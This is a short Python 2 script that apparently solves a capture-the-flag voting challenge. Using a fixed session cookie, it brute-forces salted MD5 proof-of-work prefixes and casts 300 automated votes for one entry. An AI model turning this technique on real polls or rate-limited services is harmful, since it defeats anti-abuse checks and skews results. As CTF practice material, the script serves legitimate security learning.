#!/usr/bin/python
import requests
from random import *
import string
import math
import hashlib 

def generateRandom(length):
    result=""
    characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    charactersLength = len(characters)
    for i in range (0,length):
      result =result + characters[int(math.floor (random () * charactersLength))];
    return result;

s = requests.Session()
id="14"
my_cookie = {
"name":'PHPSESSID',
"value":'tpj63rcfdim1msc4tq0ttnfjt1',
"domain":'challs.xmas.htsp.ro',
}
s.cookies.set(**my_cookie)
for i in range(0,300):
 found=False
 print "Iteration:",i
 r1 = s.get('http://challs.xmas.htsp.ro:11001/vote.php?g=1')
 print s.cookies
 while found==False:
  work=r1.text
  randomLength = int(math.floor (7 + random () * 18))
  stringGen = generateRandom (randomLength)
  md5Gen = hashlib.md5("watch__bisqwit__" + stringGen).hexdigest()
  if md5Gen[0 : len(work)] == work:
    url = "/vote.php?id=" + id + "&h=" + stringGen + "&u=1"
    r2 = s.get('http://challs.xmas.htsp.ro:11001'+url)
    print r2.cookies
    print "validator:",r1.text
    print "Response:",r2.text
    found=True

